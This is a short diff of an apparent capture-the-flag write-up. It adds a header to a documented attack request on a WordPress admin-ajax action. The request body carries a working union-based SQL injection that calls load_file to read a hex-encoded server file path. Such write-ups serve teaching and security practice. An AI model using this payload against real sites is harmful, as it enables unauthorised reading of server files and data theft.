@@ -171,6 +171,8 @@ public function populate_download_edit_form() {
 ```
 /wp-admin/admin-ajax.php?action=populate_download_edit_form 
 
+
+Content-Type: application/x-www-form-urlencoded
 data:
 id=0 union select 1,2,3,4,5,6,load_file(0x2f666c61675f69735f68657265)
 ```
